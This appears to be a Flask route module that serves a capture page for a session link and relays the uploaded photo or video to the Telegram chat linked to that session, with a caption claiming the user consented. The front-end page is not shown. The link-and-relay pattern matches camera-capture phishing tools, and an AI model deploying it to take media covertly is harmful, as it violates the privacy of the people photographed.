import os
from flask import render_template, request, jsonify, abort
from telegram import Bot

def register_routes(app, sessions):
    @app.get("/capture/<sid>")
    def capture(sid):
        if sid not in sessions:
            abort(404)
        return render_template("index.html", sid=sid)

    @app.post("/upload/<sid>")
    def upload(sid):
        if sid not in sessions:
            abort(404)
        media = request.files.get("media")
        kind = request.form.get("kind")
        if not media or kind not in ("photo", "video"):
            return jsonify(ok=False, error="ملف غير صالح"), 400
        token = os.environ["BOT_TOKEN"]
        chat_id = sessions[sid]
        bot = Bot(token=token)
        filename = media.filename or ("capture.jpg" if kind == "photo" else "capture.webm")
        caption = "ملف أرسله المستخدم بعد موافقته: " + ("صورة" if kind == "photo" else "فيديو")
        if kind == "photo":
            bot.send_photo(chat_id=chat_id, photo=media.stream, caption=caption)
        else:
            bot.send_video(chat_id=chat_id, video=media.stream, caption=caption, supports_streaming=True)
        return jsonify(ok=True)
